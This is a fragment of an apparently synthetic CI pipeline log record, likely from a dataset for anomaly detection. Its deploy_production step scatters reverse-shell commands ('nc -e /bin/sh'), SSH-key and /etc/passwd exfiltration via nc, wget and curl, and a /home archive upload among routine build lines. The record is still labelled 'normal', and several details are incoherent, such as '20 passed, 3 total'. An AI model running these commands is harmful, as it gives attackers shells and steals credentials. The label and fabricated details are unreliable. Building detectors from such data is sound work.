          "[12:18:42] WARN: Deprecated API usage",
          "Compiling utils/index.js...",
          "Connection established",
          "Done.",
          "npm install: added 500 packages",
          "[12:18:42] WARN: Deprecated API usage",
          "[12:18:42] DEBUG: Connection pool: 7 active",
          "Creating production build...",
          "Step 15/18: Testing",
          "\u2717 build failed with exit code 87",
          "\u2713 validate completed",
          "POST /api - 200 (148ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:42] DEBUG: Initializing service",
          "Pulling image: alpine:18",
          "Coverage: 98% statements, 98% branches",
          "pip: Collecting jest",
          "Artifact downloaded: 3MB",
          "npm install: resolved 1690 packages",
          "Snapshots: 20 passed, 3 total",
          "Compiling lib/utils.go...",
          "Compiling src/service.java...",
          "Building Docker image...",
          "Minifying app.js",
          "Generating source maps...",
          "[12:18:42] DEBUG: Loading configuration",
          "pip: Collecting lodash",
          "Success!",
          "WARNING: express has known vulnerabilities",
          "Coverage: 80% statements, 88% branches",
          "\u2713 Task completed in 2961ms",
          "\u2713 Step 'setup' succeeded",
          "Minifying main.js",
          "Step 16/18: Testing",
          "Cache saved successfully",
          "Cache miss for key-9728",
          "npm notice: created a lockfile",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-21T12:22:20.093237",
        "finished_at": "2025-11-21T12:22:25.036906",
        "log_lines": [
          "=== Step: deploy_production ===",
          "nc -e /bin/sh 78.251.8.100 25150",
          "[12:18:42] DEBUG: Query executed in 31ms",
          "nc -e /bin/sh 124.206.182.181 43560",
          "yarn add: Done in 15.66s",
          "Platform: darwin-arm64",
          "WARNING: express has known vulnerabilities",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 250.199.189.4 33862",
          "Finished.",
          "[12:18:42] DEBUG: Connection pool: 8 active",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 110.62.152.68 53189",
          "[12:18:42] DEBUG: Query executed in 2ms",
          "Step 12/15: Running migrations",
          "[12:18:42] DEBUG: Connection pool: 14 active",
          "[12:18:42] INFO: Starting build process",
          "Processing...",
          "Cache restored successfully (482MB)",
          "[12:18:42] INFO: Processing request",
          "Snapshots: 18 passed, 47 total",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "[12:18:42] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling components/handler.rs...",
          "npm notice: package.json updated",
          "  PASS: test_api_health (23ms)",
          "NODE_ENV=production",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Optimizing 47 modules...",
          "yarn add: Done in 18.89s",
          "[12:18:42] DEBUG: Initializing service",
          "Verifying...",
          "[12:18:42] DEBUG: Memory usage: 188MB",
          "Completed.",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling utils/service.java...",
          "Waiting...",
          "[12:18:42] DEBUG: Initializing service",
          "Time: 98.852s",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "[12:18:42] INFO: Processing request",
          "Time: 102.151s",
          "pip: Collecting eslint",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 77.88.98.229 28483",
          "pip: Collecting webpack",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "HEAD is now at e8564ae",
          "[12:18:42] DEBUG: Connection pool: 17 active",
          "[12:18:42] INFO: Processing request",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "POST /api - 200 (114ms)",
          "Connection established",
          "pip: Installing build dependencies...",
          "pip: Downloading lodash-4.0.tar.gz",
          "nc -e /bin/sh 185.194.242.173 48816",
          "OK",
          "Ready.",
          "[12:18:42] INFO: Starting build process",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "POST /upload - 202 (444ms)",
          "Using Python 3.10",
          "Pulling image: python:18",
          "[12:18:42] DEBUG: Loading configuration",
          "npm install: resolved 1846 packages",
          "[12:18:42] WARN: Deprecated API usage",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "FAILED: test_db_connect",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 234.181.186.132 48225",
          "Optimizing 66 modules...",
          "Sending 444MB of data to test.io",
          "[12:18:42] ERROR: Connection failed",
          "Time: 101.314s",
          "Sending 305MB of data to acme.corp",
          "\u2713 All checks passed",
          "Creating production build...",
          "Loading...",
          "Processing...",
          "Coverage: 70% statements, 65% branches",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 155.44.62.148 14932",
          "WARNING: react has known vulnerabilities",
          "[12:18:42] WARN: Deprecated API usage",
          "Verifying...",
          "Step 13/19: Installing dependencies",
          "NODE_ENV=production",
          "Waiting...",
          "[12:18:42] INFO: Connecting to database",
          "Compiling lib/app.ts...",
          "Installing react@3.1.3",
          "Sending 45MB of data to test.io",
          "Ran 31 tests in 50s",
          "[12:18:42] ERROR: Connection failed",
          "Compiling lib/handler.rs...",
          "Cache invalidated: build",
          "yarn add: Done in 15.15s",
          "[12:18:42] DEBUG: Loading configuration",
          "Bundling main.js",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "pip: Downloading axios-5.13.tar.gz",
          "Coverage: 91% statements, 81% branches",
          "Transforming 664 files...",
          "Verifying...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Time: 72.557s",
          "Sending 51MB of data to test.io",
          "pip: Downloading eslint-1.16.tar.gz",
          "Switched to branch 'bugfix/task-297'",
          "Switched to branch 'feature/task-298'",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying app.js",
          "Finished.",
          "pip install: Successfully installed jest-1.7",
          "nc -e /bin/sh 15.181.187.101 20067",
          "nc -e /bin/sh 163.90.9.32 28745",
          "npm install: added 317 packages",
          "Creating production build...",
          "[12:18:42] INFO: Starting build process",
          "Verifying...",
          "Processing...",
          "Bundling main.css",
          "Already up to date.",
          "Using Node.js 15.9.10",
          "Environment: staging",
          "Checking out develop branch",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 224.129.152.234 5870",
          "nc -e /bin/sh 221.144.227.149 27065",
          "Connecting to acme.corp:443...",
          "Pushing to registry...",
          "Building Docker image...",
          "[12:18:42] INFO: Request completed",
          "Switched to branch 'hotfix/task-187'",
          "Sending 441MB of data to startup.dev",
          "=== Step deploy_production completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}